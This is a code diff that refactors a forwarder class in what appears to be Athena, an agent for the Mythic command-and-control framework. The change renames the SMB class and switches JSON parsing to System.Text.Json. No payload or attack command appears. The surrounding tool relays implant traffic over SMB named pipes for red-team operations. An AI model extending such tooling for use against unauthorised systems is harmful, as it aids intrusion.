@@ -4,17 +4,20 @@ using Athena.Models.Mythic.Tasks;
 using Athena.Utilities;
 using H.Pipes;
 using H.Pipes.Args;
-using Newtonsoft.Json;
+
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Linq;
+using System.Text.Json;
+using System.Text.Json.Nodes;
+using System.Text.Json.Serialization;
 using System.Threading;
 using System.Threading.Tasks;
 
 namespace Athena.Forwarders
 {
-    public class SMB : IForwarder
+    public class Forwarder : IForwarder
     {
         public bool connected { get; set; }
         public ConcurrentBag<DelegateMessage> messageOut { get; set; }
@@ -23,7 +26,7 @@ namespace Athena.Forwarders
         private ConcurrentDictionary<string, string> partialMessages = new ConcurrentDictionary<string, string>();
         private string uuid { get; set; }
 
-        public SMB()
+        public Forwarder()
         {
             this.messageOut = new ConcurrentBag<DelegateMessage>();
         }
@@ -44,7 +47,7 @@ namespace Athena.Forwarders
         public async Task<bool> Link(MythicJob job, string uuid)
         {
             this.uuid = uuid;
-            Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
+            Dictionary<string, string> par = JsonSerializer.Deserialize<Dictionary<string, string>>(job.task.parameters);
 
             try
             {
@@ -136,7 +139,7 @@ namespace Athena.Forwarders
             try
             {
                 //Add message to out queue.
-                // DelegateMessage dm = JsonConvert.DeserializeObject<DelegateMessage>(args.Message);
+                // DelegateMessage dm = JsonSerializer.Deserialize<DelegateMessage>(args.Message);
 
                 if (this.partialMessages.ContainsKey(args.Message.uuid))
                 {
